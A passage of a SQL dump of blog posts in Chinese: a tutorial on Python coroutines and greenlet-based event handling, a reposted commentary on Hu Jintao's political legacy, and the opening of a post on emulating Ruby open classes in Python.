<span class="n">func</span><span class="p">):</span>\n        <span class="k">return</span> <span class="n">greenlet</span><span class="p">(</span><span class="n">func</span><span class="p">)</span><span class="o">.</span><span class="n">switch</span>\n</pre></div>\n</figure><p>使用这个事件框架，可以很容易的完成挂起过程 -&gt; 转移控制权 -&gt; 事件触发 -&gt; 唤醒过程的步骤。还是上文生成器协程中使用的例子，用基于 greenlet 的事件框架实现出来是这样的：</p>\n<figure class="code"><div class="highlight"><pre><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>\n<span class="kn">from</span> <span class="nn">event</span> <span class="kn">import</span> <span class="n">EventManager</span>\n\n<span class="n">event</span> <span class="o">=</span> <span class="n">EventManager</span><span class="p">()</span>\n<span class="n">event</span><span class="o">.</span><span class="n">register</span><span class="p">(</span><span class="s">&quot;click&quot;</span><span class="p">)</span>\n\n<span class="nd">@event.use</span>\n<span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>\n    <span class="k">print</span> <span class="s">&quot;=&quot;</span> <span class="o">*</span> <span class="mi">50</span>\n    <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s"> waiting click&quot;</span> <span class="o">%</span> <span class="n">name</span>\n    <span class="n">event</span><span class="o">.</span><span class="n">await</span><span class="p">(</span><span class="s">&quot;click&quot;</span><span class="p">)</span>\n    <span class="k">print</span> <span class="s">&quot;clicked !!&quot;</span>\n\n<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&quot;__main__&quot;</span><span class="p">:</span>\n    <span class="n">test</span><span class="p">(</span><span class="s">&quot;micro-thread&quot;</span><span class="p">)</span>\n    <span class="k">print</span> <span class="s">&quot;do many other works...&quot;</span>\n    <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c"># do many other works</span>\n    <span class="k">print</span> <span class="s">&quot;done... now trigger click event.&quot;</span>\n    <span class="n">manager</span><span class="o">.</span><span class="n">fire</span><span class="p">(</span><span class="s">&quot;click&quot;</span><span class="p">)</span>\n</pre></div>\n</figure><p>同样，运行结果如下：</p>\n<pre class="literal-block">\n==================================================\nmicro-thread waiting click\ndo many other works...\ndone... now trigger click event.\nclicked !!\n</pre>\n<p>在“do may other works”打印出来之后，控制权从协程切出，暂停了三秒，直到事件 click 被触发才重新切入协程中。</p>\n<p>非 Python 领域，有一个叫 Jscex <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id18" id="id8">[4]</a> 的库在没有协程的 ECMAScript 中实现了类似协程的功能，并以之控制事件。</p>\n</div>\n<div class="section" id="id9">\n<h2>总结</h2>\n<p>总的来说，我个人感觉协程给了我们一种更加轻量的异步编程方式。在这种方式中没有调度复杂的系统级线程，没有容易出错的临界资源，反而走了一条更加透明的路 —— 显式的切换控制权代替调度器充满“猜测”的调度算法，放弃进程内并发使用清晰明了的串行方式。结合多进程，我想协程在异步编程尤其是 Python 异步编程中的应用将会越来越广。</p>\n</div>\n<div class="section" id="id10">\n<h2>附加更新</h2>\n<p>在 SlideShare 上看到了一个介绍 node.js 异步工作原理和缺陷的 presentation <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id19" id="id11">[5]</a> ，感觉作者所说的 node.js 缺陷正是多线程异步的缺陷，而协程擅长的正是这样的领域。</p>\n<table class="docutils footnote" frame="void" id="id12" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id2">[0]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E8%A7%82%E5%AF%9F%E8%80%85%E6%A8%A1%E5%BC%8F">维基百科中文站上的“观察者模式”词条</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id14" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id4">[1]</a></td><td><a class="reference external" href="http://blog.codingnow.com/2010/06/masterminds_of_programming_7_lua.html">云风翻译《编程之魂》中采访 Lua 创始人选段</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id15" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id5">[2]</a></td><td><a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E5%8D%8F%E7%A8%8B">维基百科中文站上的“协程”词条</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id17" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id6">[3]</a></td><td><a class="reference external" href="http://pypi.python.org/pypi/greenlet">Python 协程支持库 greenlet</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id18" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id8">[4]</a></td><td><a class="reference external" href="https://github.com/JeffreyZhao/jscex">Jscex 项目在 github 上的主页</a></td></tr>\n</tbody>\n</table>\n<table class="docutils footnote" frame="void" id="id19" rules="none">\n<colgroup><col class="label" /><col /></colgroup>\n<tbody valign="top">\n<tr><td class="label"><a class="fn-backref" href="https://blog.tonyseek.com/atom.xml#id11">[5]</a></td><td><a class="reference external" href="http://www.slideshare.net/mysqlops/nodejs-9313477">Nodejs异步的原理和缺陷</a></td></tr>\n</tbody>\n</table>\n</div>', '2014-11-06 23:43:08', 6, '2012-02-12 11:21:00', '2012-02-12 11:21:00', 0, '[["\\u534f\\u7a0b", 0.23830101334684384], ["\\u5f02\\u6b65", 0.19107611925581394], ["\\u7ebf\\u7a0b", 0.1826974435659136], ["name", 0.1429806080081063], ["event", 0.1429806080081063], ["self", 0.12709387378498338], ["http", 0.12709387378498338], ["Python", 0.11915050667342192], ["\\u56de\\u8c03", 0.1159141820681063], ["click", 0.11120713956186046], ["def", 0.11120713956186046], ["\\u591a\\u7ebf\\u7a0b", 0.11083596798936879], ["__", 0.09532040533873753], ["\\u4e8b\\u4ef6", 0.09083767548964784], ["\\u7f16\\u7a0b", 0.08499870454391362], ["greenlet", 0.07943367111561461], ["\\u8c03\\u5ea6", 0.07888504793209303], ["\\u63a7\\u5236\\u6743", 0.07581214468000665], ["\\u51fd\\u6570", 0.07531100886516943], ["\\u5e76\\u53d1", 0.0743598671638804]]', NULL, NULL, '自从 PyCon 2011 协程成为热点话题以来，我一直对此有着浓厚的兴趣。为了异步，我们曾使用多线程编程。然而线程在有着 GIL 的 Python 中带来的性能瓶颈和多线程编程的高出错风险，“协程 + 多进程”的组合渐渐被认为是未来发展的方向。技术容易更新，思维转变却需要一个过渡。我之前在异步事件处理方面已经习惯了回调 + 多线程的思维方式，转换到协程还非常的不适应。这几天我非常艰难地查阅了一些资料并思考，得出了一个可能并不可靠的总结。尽管这个总结的可靠性很值得怀疑，但是我还是决定记录下来，因为我觉得既然是学习者，就不应该怕无知。如果读者发现我的看法有偏差并指出来，我将非常感激。\n\n\n多线程下异步编程的方式\n线程的出现，为开发者带来了除多进程之外另一种实现并发的方式。比起多进程，多线程有另一些优势，比如可以访问进程内的变量，也就是共享资源。还有的说法说线程创建比进程创建开销低，考虑到这个问题在 Windows 一类进程创建机制很蹩脚的系统才存在，故先忽略。总的来说，线程除了可以实现进程实现的“并发执行”之外，还有另一个功能，就是管理应用程序内部的“事件”。我不知道把这种事件处理分类到异步中是不是合适，但事件处理一定是基于共享进程内资源才能实现的，所以这是多线程可以做到而多进程做不到的一点。\n异步处理基于两个前提。第一个前提是支持并发，当然这是基本前提。这里的并发并不一定要是并行，也就是说允许逻辑上异步，实现上串行；第二个前提是支持回调（callback），因为并发的、异步的处理不会阻塞当前正在被执行的流程，所以“任务完成后”要执行的步骤应该写在回调中，绝大多数回调是通过函数来实现。\n多线程之所以适合异步编程，是因为它同时支持并发和回调。无论是系统级的线程还是用户级的线程，逻辑上都能并发执行不同的控制流；同时因为能共享进程内资源，所以回调只需要通过简单的回调函数。\n出于回调函数的处理比较杂乱，一般异步程序都引入了事件机制。也就是说把一系列的回调函数注册到某个命名的事件，当这个事件被触发的时候，执行这些回调函数。例如在 ECMAScript 中，需要在访问了远程网址之后，要把响应的结果填充到页面中，在同步（阻塞）的情况下是这么做的：\n// 在打开了豆瓣首页的标签页\n// 打开了一个 firebut/chrome console 测试\n\nvar http = new XMLHttpRequest();\n\n// 第三个参数为 false 代表不使用异步\nhttp.open("GET", "/site", false);\n// 发送请求\nhttp.send();\n// 填充响应，一秒钟变页面\ndocument.write(http.response);\n\n处理起来非常简单，因为 XMLHttpRequest 的 send 方法会阻塞主线程，所以我们去读取 http.response 的时候一定已经完成了远程访问。如果使用基于多线程和回调函数的异步方式呢？问题会变得麻烦很多：\nvar http = new XMLHttpRequest();\n\nhttp.open("GET", "/site", true);\n\n// 现在必须使用回调函数\nhttp.onreadystatechange = function() {\n    if (http.readyState == http.DONE) {\n            if (http.status == 200) {\n                    document.write(http.response);\n            }\n    } else if (http.readyState == http.LOADING) {\n            document.write("正在加载<br />");\n    }\n};\n\nhttp.send();\n\n由于使用异步方式之后 send 方法不再阻塞主线程，所以必须设置 onreadystatechange 回调函数。XMLHttpRequest 有多种加载状态，每次状态改变会调用一次用户设置的回调函数。现在编程变得麻烦，但是用户体验变得更好，因为不再阻塞主线程，用户可以看到“正在加载”的提示，并且在此期间还可以异步做其他事情。为了简化回调函数的使用，一般采取两种方式改进回调，第一种方式是对于简单的回调，直接在参数中将回调函数传入，这种方式对有匿名函数的语言来说方便了很多（比如 ECMAScript 和 Ruby，显然 C 语言和 Python 不在此列）；第二种方式是对于复杂的回调，以事件管理器替代。仍然是 ajax 请求的例子，jquery 提供的封装就采取了第一种方式：\n$.get("/site", function(response){\n    document.write(http.response);\n});\n\n而 W3C 规定的浏览器 window 对象，则采取了事件管理器的方式管理更为复杂的异步支持：\n// 别在 IE 下试，IE 的函数名不一样。\nwindow.addEventListener("load", function(){\n    // do something\n}, false);\n\n采取事件管理器的本质还是使用回调，不过这种方式提出了“事件”的概念，将回调函数统一注册到一个管理器中，并对应到各自的“事件”，需要调用这一系列回调函数的时候，就“触发”这一个“事件”，管理器会调用注册进来的回调函数。这种做法解除了调用者和被调用者的耦合，其实就是 GoF 观察者模式 [0] 的具体应用。\n\n\n用多线程实现异步的弊病\n\n“我们仍然认为，如果在连 a=a+1 都没有确定结果的语言中，无人可以写出正确的程序。” —— 《编程之魂》 [1]\n用多线程来实现异步最大的弊病，是它真的是并发的。采用线程实现的异步，即使不存在多核并行，线程执行的先后仍然是不可预知的。操作系统课程上我们也学到过，称之为不可再现性。究其原因，线程的调度毕竟是调度器来完成的，无论是系统级的调度还是用户级的调度，调度器都会因为 IO 操作、时间片用完等诸多的原因，而强制夺取某个线程的控制权。这种不可再现性给线程编程带来了极大的麻烦。如果是上段中的简单代码还没什么，若是情况更加复杂一些，在单独的线程中操作了某共享资源，那么这个共享资源就会成为危险的临界资源，一时疏忽忘记加锁就会带来数据不一致问题。而加锁本身是把对资源的并行访问串行化，所以锁往往又是拖慢系统效率的罪魁祸首，由此又发展出了多种复杂的锁机制。\nUnix 编程哲学强调 Simple is better，有时跳出来想想，有些复杂性是不是走了弯路导致的呢？首先，多线程编程以并发和事件机制来实现异步，并发可以带来性能的提升，同时能给我们非阻塞工作方式。对于临界资源的访问，我们又必须使之串行化，甚至诞生了管道、消息队列这种绝对串行化的通讯方式。为何不干脆就让所有的操作串行化，以此换取资源的安全，多核资源的利用则交给多进程实现呢？Python 的做法就是这样。Python 的线程是系统级线程，由内核调度，却不是真正的并发执行。因为 Python 有一个全局解释器锁（GIL），它导致 Python 内部的线程执行实质上是串行的。\n串行的线程无法充分利用多核资源，但是换来了线程安全，看上去是比较明智的选择，但 Python 的线程却有个很大的缺点 —— 这些线程是系统级的。系统级线程由内核来调度，调度的开销会比想象的要大，而很多情况下这些调度开销是付出的很没有价值的。比如一次异步的远程网址获取，本来只需要在开始访问网络的时候释放主线程控制权，得到响应之后返回主线程控制权，使用系统级线程之后调度全部委托给了系统内核，简单问题往往就复杂化了。协程（Coroutine） [2] 提供了不同于线程的另一种方式，它首先是串行化的。其次，在串行化的过程中，协程允许用户显式释放控制权，将控制权转移另一个过程。释放控制权之后，原过程的状态得以保留，直到控制权恢复的时候，可以继续执行下去。所以协程的控制权转移也称为“挂起”和“唤醒”。\n\n\nPython 中的协程\n其实 Python 语言内置了协程的支持，也就是我们一般用来制作迭代期的“生成器”（Generator）。生成器本身不是一个完整的协程实现，所以此外 Python 的第三方库中还有一个优秀的替代品 greenlet [3] 。\n使用生成器作为协程支持，可以实现简单的事件调度模型：\nfrom time import sleep\n\n# Event Manager\n\nevent_listeners = {}\n\ndef fire_event(name):\n    event_listeners[name]()\n\ndef use_event(func):\n    def call(*args, **kwargs):\n        generator = func(*args, **kwargs)\n        # 执行到挂起\n        event_name = next(generator)\n        # 将“唤醒挂起的协程”注册到事件管理器中\n        def resume():\n            try:\n                next(generator)\n            except StopIteration:\n                pass\n        event_listeners[event_name] = resume\n    return call\n\n# Test\n\n@use_event\ndef test_work():\n    print("=" * 50)\n    print("waiting click")\n    yield "click"  # 挂起当前协程, 等待事件\n    print("clicked !!")\n\nif __name__ == "__main__":\n    test_work()\n    sleep(3)  # 做了很多其他事情\n    fire_event("click")  # 触发了 click 事件\n\n测试运行可以看到，打印出“waiting click”之后，暂停了三秒，也就是协程被挂起，控制权回到主控制流上，之后触发“click”事件，协程被唤醒。协程的这种“挂起”和“唤醒”机制实质上是将一个过程切分成了若干个子过程，给了我们一种以扁平的方式来使用事件回调模型。\n\n\n用 greenlet 实现简单事件框架\n用生成器实现的协程有些繁琐，同时生成器本身也不是完整的协程实现，因此经常有人批评 Python 的协程比 Lua 弱。其实 Python 中只要放下生成器，使用第三方库 greenlet，就可以媲美 Lua 的原生协程了。greenlet 提供了在协程中直接切换控制权的方式，比生成器更加灵活、简洁。\n基于把协程看成“切开了的回调”的视角，我使用 greenlet 制作了一个简单的事件框架。\nfrom greenlet import greenlet, getcurrent\n\n\nclass Event(object):\n    def __init__(self, name):\n        self.name = name\n        self.listeners = set()\n\n    def listen(self, listener):\n        self.listeners.add(listener)\n\n    def fire(self):\n        for listener in self.listeners:\n            listener()\n\n\nclass EventManager(object):\n    def __init__(self):\n        self.events = {}\n\n    def register(self, name):\n        self.events[name] = Event(name)\n\n    def fire(self, name):\n        self.events[name].fire()\n\n    def await(self, event_name):\n        self.events[event_name].listen(getcurrent().switch)\n        getcurrent().parent.switch()\n\n    def use(self, func):\n        return greenlet(func).switch\n\n使用这个事件框架，可以很容易的完成挂起过程 -> 转移控制权 -> 事件触发 -> 唤醒过程的步骤。还是上文生成器协程中使用的例子，用基于 greenlet 的事件框架实现出来是这样的：\nfrom time import sleep\nfrom event import EventManager\n\nevent = EventManager()\nevent.register("click")\n\n@event.use\ndef test(name):\n    print "=" * 50\n    print "%s waiting click" % name\n    event.await("click")\n    print "clicked !!"\n\nif __name__ == "__main__":\n    test("micro-thread")\n    print "do many other works..."\n    sleep(3)  # do many other works\n    print "done... now trigger click event."\n    manager.fire("click")\n\n同样，运行结果如下：\n\n==================================================\nmicro-thread waiting click\ndo many other works...\ndone... now trigger click event.\nclicked !!\n\n在“do may other works”打印出来之后，控制权从协程切出，暂停了三秒，直到事件 click 被触发才重新切入协程中。\n非 Python 领域，有一个叫 Jscex [4] 的库在没有协程的 ECMAScript 中实现了类似协程的功能，并以之控制事件。\n\n\n总结\n总的来说，我个人感觉协程给了我们一种更加轻量的异步编程方式。在这种方式中没有调度复杂的系统级线程，没有容易出错的临界资源，反而走了一条更加透明的路 —— 显式的切换控制权代替调度器充满“猜测”的调度算法，放弃进程内并发使用清晰明了的串行方式。结合多进程，我想协程在异步编程尤其是 Python 异步编程中的应用将会越来越广。\n\n\n附加更新\n在 SlideShare 上看到了一个介绍 node.js 异步工作原理和缺陷的 presentation [5] ，感觉作者所说的 node.js 缺陷正是多线程异步的缺陷，而协程擅长的正是这样的领域。\n\n\n\n[0]维基百科中文站上的“观察者模式”词条\n\n\n\n\n\n[1]云风翻译《编程之魂》中采访 Lua 创始人选段\n\n\n\n\n\n[2]维基百科中文站上的“协程”词条\n\n\n\n\n\n[3]Python 协程支持库 greenlet\n\n\n\n\n\n[4]Jscex 项目在 github 上的主页\n\n\n\n\n\n[5]Nodejs异步的原理和缺陷\n\n\n', NULL, NULL, NULL),
(94, 'https://blog.tonyseek.com/post/the-heritage-of-hu/', '[转载]《外交学者》蒋学勤：胡锦涛的遗产', '<p>上周，写&quot;中国力量&quot;专栏的同事David Cohen的讨论了中国主席胡锦涛最近发表的一篇文章，他认为中国和西方正在进行一场文化战。这篇文章所用的言辞让西方的观察者们感到警惕，并回想起那些挥着红宝书的红卫兵们——&quot;我们必须清楚地认识到西方敌对势力正在加紧西化和分化中国，意识形态和文化战场是他们长期渗透的领域。&quot;</p>\n\n<p>胡锦涛在他整个任期内表现出的都是最为循规蹈矩、面无表情的技术官僚，于是这个时刻也就成为了很罕见的他确实说了、也值得评论一番的事，我想谈谈我的胡锦涛文章的看法，以及这对中国的2012来讲意味着什么。</p>\n<p>我先要说我同意David Cohen的说法，胡锦涛的文章，就象任何一位中国领导人所说的任何事一样，是要让中国共产党内部消化的。在2012年十月权力交接到来之前的准备期，胡锦涛主要关心两个方面：留下属于他的遗产，同时指明中共的未来战略。</p>\n<p>其次，胡锦涛的文章中最有趣的并不是他说了什么，而是他没有说什么：也就是，他选择聚焦在一个中国人不认为是问题的问题上，同时把他在江泽民之后执政十年来都未解决的问题遗留了下来——贫富之间的差距、党内腐败和中国的道德崩坏。</p>\n<p>在胡锦涛的任期内，胡锦涛都在严厉的空洞的讲演中强调了这三个问题，最近一次是2011年7月，他在中共成立90周年时发表的演讲。与此同时，这些问题更加恶化了。</p>\n<p>用一些让外国人惊讶、制造恐慌的的话题来引开真正迫在眉睫的问题，在政治上，这总是个聪明的招数，而用这&quot;最后一招&quot;也体现出党已经多么歇斯底里。</p>\n<p>还有，胡锦涛的文章暗示说中国的道德崩坏是中国的文化产业未能影响中国人的身心修养所致，而不是中国经济增长模式带来的副作用。去年发生的郭美美和小悦悦事件中象征了这种道德崩坏。</p>\n<p>是的，解放军能用唱歌跳舞的方式激励农民加入共产主义革命，但是今天的中国已经不是在对抗地主和外国恶魔的压迫，对抗的更多是它自己；特别是，自吹自擂的北京共识是党以承诺&quot;繁荣稳定&quot;换取中国的中产阶级在政治上不发声的一种政治妥协。</p>\n<p>北京共识让党在短期之内获得了政治合法性，从长期趋势来看，则是以牺牲中国的经济发展和社会纽带为代价。</p>\n<p>要理解这是怎么回事，想一想安然和华尔街，二者都曾经有着足以吸引员工的骄傲之处。有一段时间，他们的利润都曾经达到过辉煌的顶端，但最终安然在自己的谎言和丑闻中破产了，如果华盛顿没有出手干预的话，华尔街的下场也是如此。对中国经济来说，破产的银行，地方政府债务高企，这可能才是最大的无法实现的幻梦。</p>\n<p>Daniel Pink在他的Drive一书中说，人们的功利心让人们变得不快乐、没有创造力、短视又何妨 ，只想尽可能多地挣钱。对今天中国的中产阶级来说，这些都很很明显，中国的中产阶级对路易威登手袋的痴狂对中国的经济和精神都没有好处。</p>\n<p>最后，胡锦涛的文章的用词、语气和文风，正好和总理温家宝呼吁中国要发展&quot;民主&quot;和&quot;创造力&quot;的讲话背道而驰。</p>\n<p>这些呼吁表明的是对一种新现实的理解，这种现实和互联网、全球化和自由市场，释放出公民的创造性，让他们讲出政治意见等等相匹配。如果政府拒绝这么做的话，不仅会损害经济的增长，也会失去政治上的合法性和权威——中共现在每天都在失去这些。</p>\n<p>不幸的是，就是因为中共没有政治上的想象力，也因为它一心只想保持权力，才让它对新的现实视而不见。那么，就等着看中国的社交媒体上在2012年出现更多的吓人话和审查吧。</p>', '2014-11-06 23:43:08', 6, '2012-01-21 23:05:00', '2012-01-21 23:05:00', 0, '[["\\u80e1\\u9526\\u6d9b", 0.18455631260296806], ["\\u4e2d\\u56fd", 0.14514551237410958], ["\\u6587\\u7ae0", 0.09073191678547946], ["2012", 0.0818819691979452], ["\\u5d29\\u574f", 0.07878618067945205], ["\\u4e2d\\u5171", 0.06661212297515982], ["\\u4e2d\\u4ea7\\u9636\\u7ea7", 0.061314505216438366], ["\\u653f\\u6cbb", 0.05862834974474886], ["Cohen", 0.0545879794652968], ["David", 0.0545879794652968], ["\\u95ee\\u9898", 0.05429470648054795], ["\\u9053\\u5fb7", 0.04885057835842466], ["\\u5b89\\u7136", 0.04308113942155251], ["\\u73b0\\u5b9e", 0.04201258297869863], ["\\u5408\\u6cd5\\u6027", 0.04172832747570777], ["\\u521b\\u9020\\u529b", 0.04157482696977169], ["\\u7ecf\\u6d4e", 0.04080113940776256], ["\\u897f\\u65b9", 0.0397796344139726], ["\\u53ea\\u60f3", 0.03864200156643836], ["\\u534e\\u5c14\\u8857", 0.03862219151347032]]', NULL, NULL, '上周，写"中国力量"专栏的同事David Cohen的讨论了中国主席胡锦涛最近发表的一篇文章，他认为中国和西方正在进行一场文化战。这篇文章所用的言辞让西方的观察者们感到警惕，并回想起那些挥着红宝书的红卫兵们——"我们必须清楚地认识到西方敌对势力正在加紧西化和分化中国，意识形态和文化战场是他们长期渗透的领域。"\n\n胡锦涛在他整个任期内表现出的都是最为循规蹈矩、面无表情的技术官僚，于是这个时刻也就成为了很罕见的他确实说了、也值得评论一番的事，我想谈谈我的胡锦涛文章的看法，以及这对中国的2012来讲意味着什么。\n我先要说我同意David Cohen的说法，胡锦涛的文章，就象任何一位中国领导人所说的任何事一样，是要让中国共产党内部消化的。在2012年十月权力交接到来之前的准备期，胡锦涛主要关心两个方面：留下属于他的遗产，同时指明中共的未来战略。\n其次，胡锦涛的文章中最有趣的并不是他说了什么，而是他没有说什么：也就是，他选择聚焦在一个中国人不认为是问题的问题上，同时把他在江泽民之后执政十年来都未解决的问题遗留了下来——贫富之间的差距、党内腐败和中国的道德崩坏。\n在胡锦涛的任期内，胡锦涛都在严厉的空洞的讲演中强调了这三个问题，最近一次是2011年7月，他在中共成立90周年时发表的演讲。与此同时，这些问题更加恶化了。\n用一些让外国人惊讶、制造恐慌的的话题来引开真正迫在眉睫的问题，在政治上，这总是个聪明的招数，而用这"最后一招"也体现出党已经多么歇斯底里。\n还有，胡锦涛的文章暗示说中国的道德崩坏是中国的文化产业未能影响中国人的身心修养所致，而不是中国经济增长模式带来的副作用。去年发生的郭美美和小悦悦事件中象征了这种道德崩坏。\n是的，解放军能用唱歌跳舞的方式激励农民加入共产主义革命，但是今天的中国已经不是在对抗地主和外国恶魔的压迫，对抗的更多是它自己；特别是，自吹自擂的北京共识是党以承诺"繁荣稳定"换取中国的中产阶级在政治上不发声的一种政治妥协。\n北京共识让党在短期之内获得了政治合法性，从长期趋势来看，则是以牺牲中国的经济发展和社会纽带为代价。\n要理解这是怎么回事，想一想安然和华尔街，二者都曾经有着足以吸引员工的骄傲之处。有一段时间，他们的利润都曾经达到过辉煌的顶端，但最终安然在自己的谎言和丑闻中破产了，如果华盛顿没有出手干预的话，华尔街的下场也是如此。对中国经济来说，破产的银行，地方政府债务高企，这可能才是最大的无法实现的幻梦。\nDaniel Pink在他的Drive一书中说，人们的功利心让人们变得不快乐、没有创造力、短视又何妨 ，只想尽可能多地挣钱。对今天中国的中产阶级来说，这些都很很明显，中国的中产阶级对路易威登手袋的痴狂对中国的经济和精神都没有好处。\n最后，胡锦涛的文章的用词、语气和文风，正好和总理温家宝呼吁中国要发展"民主"和"创造力"的讲话背道而驰。\n这些呼吁表明的是对一种新现实的理解，这种现实和互联网、全球化和自由市场，释放出公民的创造性，让他们讲出政治意见等等相匹配。如果政府拒绝这么做的话，不仅会损害经济的增长，也会失去政治上的合法性和权威——中共现在每天都在失去这些。\n不幸的是，就是因为中共没有政治上的想象力，也因为它一心只想保持权力，才让它对新的现实视而不见。那么，就等着看中国的社交媒体上在2012年出现更多的吓人话和审查吧。', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(95, 'https://blog.tonyseek.com/post/open-class-in-python/', '在 Python 中实现 Ruby 的 Open Class 和特异方法', '<p>Ruby 中的 OpenClass 是个非常方便的特性，我们可以扩充一个已有的类，往里面添加方法。甚至还能脱离类，向实例中添加该实例独有的方法，称为“特异方法”。这种做法的前提是语言具有足够的动态特性，能够运行时更改语言结构，所谓“ <a class="reference external" href="http://zh.wikipedia.org/zh-cn/%E5%85%83%E7%BC%96%E7%A8%8B&gt;">元编程</a> ”（Meta-Programming）能力。</p>\n<p>Python 也有类似的能力，但是不像 Ruby 有原生的语法支持。在 Python 中实现 OpenClass 和特异方法基本原理与 Ruby 中的原理类似——“函数、方法也是一种对象”。</p>\n<p>本文只讨论 Python 的 <em>新式类</em> ，对于 old-style class 保持无视。</p>\n\n<div class="section" id="ruby-openclass">\n<h2>Ruby 中的 OpenClass 与特异方法</h2>\n<p>OpenClass 即在一个类已经完成定义之后，再次向其中添加方法。在 Ruby 中的实现方法就是定义同名类。在 Ruby 中定义同名类不会像 Java 一样被认为是编译错误，也不会像 Python 一样“新定义的类覆盖旧类”，而是把同名类中定义的方法全部附加到已定义的旧类中。以下为示例代码：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">class</span> <span class="nc">Foo</span>\n  <span class="k">def</span> <span class="nf">m1</span><span class="p">()</span>\n    <span class="nb">puts</span> <span class="s2">&quot;m1 has been called&quot;</span>\n  <span class="k">end</span>\n<span class="k">end</span>\n\n<span class="k">class</span> <span class="nc">Foo</span>\n  <span class="k">def</span> <span class="nf">m2</span><span class="p">()</span>\n    <span class="nb">puts</span> <span class="s2">&quot;m2 has been called&quot;</span>\n  <span class="k">end</span>\n<span class="k">end</span>\n\n<span class="n">foo</span> <span class="o">=</span> <span class="no">Foo</span><span class="o">.</span><span class="n">new</span>\n<span class="n">foo</span><span class="o">.</span><span class="n">m1</span>\n<span class="n">foo</span><span class="o">.</span><span class="n">m2</span>\n</pre></div>\n</figure><p>特异方法和 OpenClass 有点类似，不过附加的方法不是附加到类中，而是附加到特定的实例中。被附加的方法仅仅在目标实例中存在，不会影响该类的其他实例。示例代码：</p>\n<figure class="code"><div class="highlight"><pre><span class="n">foo</span> <span class="o">=</span> <span class="no">Foo</span><span class="o">.</span><span class="n">new</span>\n<span class="k">def</span> <span class="nc">foo</span><span class="o">.</span><span class="nf">m3</span><span class="p">()</span>\n  <span class="nb">puts</span> <span class="s2">&quot;m3 has been called&quot;</span>\n<span class="k">end</span>\n\n<span class="n">foo</span><span class="o">.</span><span class="n">m3</span>\n</pre></div>\n</figure></div>\n<div class="section" id="python">\n<h2>Python 方法探幽</h2>\n<div class="section" id="id1">\n<h3>从函数到绑定方法</h3>\n<p>Python 中定义方法，和写一个函数是大致相同的，唯一的不同之处有两点：第一，作为方法的函数必须嵌套在类的结构里；第二，作为方法的函数第一个参数必须为 self。</p>\n<p>在一个 Python 类实例化生产出一个实例的时候，类中的所有“函数”都会被包装一层再放到实例的成员字典里（装饰器模式 <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id8" id="id2">[1]</a> ）。包装层除了添加了一些元信息之外，还对原始的函数做了“装饰”，装饰的效果为“偏函数”。</p>\n<blockquote>\n通过为已经存在的某个函数指定数个参数，生成一个新的函数，这个函数只需要传入剩余未指定的参数就能实现原函数的全部功能，这被称为偏函数。—— AstralWind <a class="footnote-reference" href="https://blog.tonyseek.com/atom.xml#id10" id="id3">[2]</a></blockquote>\n<p>也就是说，对于类中有 n 个参数的函数，实例中会有对应的可调用（callable）对象，接受 n-1 个参数的调用。被省略的那个参数就是 self —— 在偏函数化的过程中被赋予了当前实例。</p>\n<p>概念上来说，可以把这个包装过程用如下代码大致模拟（仅仅是概念上）：</p>\n<figure class="code"><div class="highlight"><pre><span class="k">def</span> <span class="nf">unbound_method</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">):</span>\n    <span class="k">pass</span>\n\n<span class="c"># 对于 obj1 中的绑定方法</span>\n<span class="k">def</span> <span class="nf">bound_method</span><span class="p">(</span><span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">):</span>\n    <span class="k">return</span> <span class="n">unbound_method</span><span class="p">(</span><span class="n">obj1</span><span class="p">,</span> <span class="n">arg1</span><span class="p">,</span> <span class="n">arg2</span><span class="p">)</span>\n</pre></div>\n</figure><p>掌握了 Python 的这个特点，我们就可以模拟语言内置的“方法绑定”过程，实现模拟 Ruby 的“特异方法”。</p>\n</div>\n<div class="section" id="id4">\n<h3>未绑定方法</h3>\n<p>如果使用的是 py3k，嵌套定义在类中的函数和定义在全局作用域的函数是没有区别的。类实例化出实例的时候，“方法绑定”的过程也是基于这种 raw function。但是 Python 2.x 的处理方式有所区别，尝试一下便知：</p>\n<figure class="code"><div class="highlight"><pre><span class="c"># in python 2.x</span>\n<span class="k">class</span> <span class="nc">Spam</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>\n    <span class="k">def</span> <span class="nf">egg</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>\n        <span class="k">pass</span>\n\n    <span class="k">print</span> <span class="n">egg</span> <span class="c"># output: &lt;function egg at 0x02105630&gt;</span>\n\n<span 